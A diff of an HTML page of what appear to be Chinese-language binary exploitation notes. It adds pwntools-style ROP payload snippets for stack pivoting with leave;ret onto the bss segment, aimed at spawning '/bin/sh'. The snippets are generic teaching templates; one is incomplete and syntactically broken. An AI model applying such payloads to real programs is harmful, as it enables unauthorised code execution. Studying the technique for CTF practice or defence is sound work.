@@ -17,7 +17,33 @@
 将eax赋值为3</p>
 <h3 id="_2">栈转移<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
 <p>寻找 leave;ret;指令，然后更改ebp的值即可
-leave= mov esp,ebp,pop ebp;</p>
+<div class="codehilite"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+<span class="c1">#leave= mov esp,ebp,pop ebp</span>
+</pre></div>
+例子：将esp设置到bss段上
+<div class="codehilite"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+  <span class="p">[</span>
+  <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span> <span class="c1"># 覆盖到ret</span>
+  <span class="n">read_plt</span><span class="p">,</span> <span class="c1"># 读100个字节到base_stage</span>
+  <span class="n">ppp_ret</span><span class="p">,</span> <span class="c1"># pop esi ; pop edi ; pop ebp ; ret 清空参数</span>
+  <span class="mi">0</span><span class="p">,</span>
+  <span class="n">base_stage</span><span class="p">,</span>
+  <span class="mi">100</span><span class="p">,</span>
+  <span class="n">pop_ebp_ret</span><span class="p">,</span> <span class="c1"># 把base_stage pop到ebp中</span>
+  <span class="n">base_stage</span><span class="p">,</span>
+  <span class="n">leave_ret</span>  <span class="c1">#mov esp,ebp;pop ebp</span>
+  <span class="p">]</span>
+<span class="p">)</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
+<span class="n">payload1</span><span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+  <span class="p">[</span>
+    <span class="s1">&#39;A&#39;</span> <span class="o">*</span><span class="mi">4</span> <span class="c1"># 接payload1，ebp=&#39;AAAA&#39;</span>
+    <span class="n">write_plt</span>
+    <span class="c1">#...</span>
+  <span class="p">]</span>
+<span class="p">)</span>
+</pre></div></p>
 <h2 id="_3">通用技术<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
 <p>常用的栈布局如下
 <div class="codehilite"><pre><span></span><span class="c1"># 32位</span>
